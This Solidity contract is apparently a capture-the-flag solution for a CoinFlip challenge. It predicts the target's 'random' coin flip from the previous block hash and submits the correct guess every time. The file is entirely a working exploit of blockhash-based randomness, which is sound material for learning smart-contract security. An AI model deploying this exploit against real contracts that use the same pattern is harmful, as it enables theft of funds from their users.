// SPDX-License-Identifier: MIT
pragma solidity ^0.6;

import "OpenZeppelin/openzeppelin-contracts@3.0.0/contracts/math/SafeMath.sol";
import "./local/CoinFlip.sol";

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract Guess {
    using SafeMath for uint256;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    ICoinFlip coin_flip;

    constructor(address _t) public {
        coin_flip = ICoinFlip(_t);
    }

    function guess() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        coin_flip.flip(coinFlip == 1 ? true : false);
    }
}
